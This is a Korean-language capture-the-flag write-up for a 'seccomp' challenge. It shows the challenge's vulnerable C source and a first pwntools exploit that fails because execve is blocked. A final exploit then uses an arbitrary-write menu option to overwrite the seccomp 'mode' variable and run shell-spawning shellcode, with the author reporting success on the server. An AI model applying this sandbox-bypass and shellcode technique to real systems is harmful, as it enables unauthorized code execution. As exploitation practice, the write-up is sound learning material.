# Seccomp

**파일 환경**

```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**seccomp.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <sys/mman.h>

int mode = SECCOMP_MODE_STRICT;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))

    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };

    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }

    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}

int main(int argc, char* argv[])
{
    void (*sc)();
    unsigned char *shellcode;
    int cnt = 0;
    int idx;
    long addr;
    long value;

    initialize();

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
    return 0;
}
```

**코드 분석**

일단 No Pie에 Partial RELRO 니까 got overwrite 가 먼저 떠오른다.   
그 외에도 3번 옵션에서 특정 변수를 그냥 덮어버릴 수 있는게  보인다.  

그래도 쉘코드를 받는 함수이니 쉘 실행 쉘코드를 넣어보자.  

<br>

**익스플로잇 코드 찾기 과정**

바로 익스플로잇 코드를 짜봤다.  

<br>

**익스플로잇 코드 (실패)**

```python
from pwn import *

context.arch = 'amd64'
# p = remote()
p = process('./seccomp')
e = ELF('./seccomp')

p.sendlineafter('> ', b'1')
p.recvuntil(b'shellcode: ')

payload = asm(shellcraft.sh())
p.send(payload)

p.sendlineafter('> ', b'2')
p.interactive()
```

이걸 실행했더니,

<img width="1431" height="575" alt="image" src="https://github.com/user-attachments/assets/bb040250-9968-4db7-b4fd-6561dfab26fd" />  

<br>

실패했다.  
 
seccomp에서 execve 를 차단하는가보다.   
seccomp-tools 를 사용하질 못해서 어떤 걸 차단하는지 못봤지만 대부분 시스템 콜이 막히는 것 같다.   

그러니 3번 선택지에서 특정 변수를 덮어버리는 방법을 써볼까한다.   
mode를 덮어버리면 seccomp이 실행 안되지 않을까  

바로 실행해보자   


<img width="1060" height="289" alt="image" src="https://github.com/user-attachments/assets/790f613c-94ae-46be-aa97-7016a90de95d" />

어차피 심볼로 쓸거지만 모드 위치도 슬쩍 봐주고  

코드를 작성했다.   

<br>

**익스플로잇 코드 (최종)**

```python
from pwn import *

context.arch = 'amd64'
# p = remote()
p = process('./seccomp')
e = ELF('./seccomp')

exit_addr = e.symbols['exit']
mode_addr = e.symbols['mode']

p.sendlineafter('> ', b'3')
p.sendlineafter('addr: ', str(mode_addr))
p.sendlineafter('value: ', '0') 

p.sendlineafter('> ', b'1')
p.recvuntil(b'shellcode: ')

payload = asm(shellcraft.sh())
p.send(payload)

p.sendlineafter('> ', b'2')
p.interactive()
```

이렇게 짜주고 실행을 해보면  

<img width="1432" height="738" alt="image" src="https://github.com/user-attachments/assets/3eef6791-a68c-415b-8870-f503197d9fd7" />

성공했다 ㅎㅎ

<br>

<img width="1429" height="849" alt="image" src="https://github.com/user-attachments/assets/7939e15d-b2bb-49c1-beb6-7f12e941b1ef" />

서버에서도 역시 잘된다.   

2단계 난이도였는데 최단기간으로 풀었다.  
seccomp 파트는 전부 중요하니까 잘 기억해두고 있자.
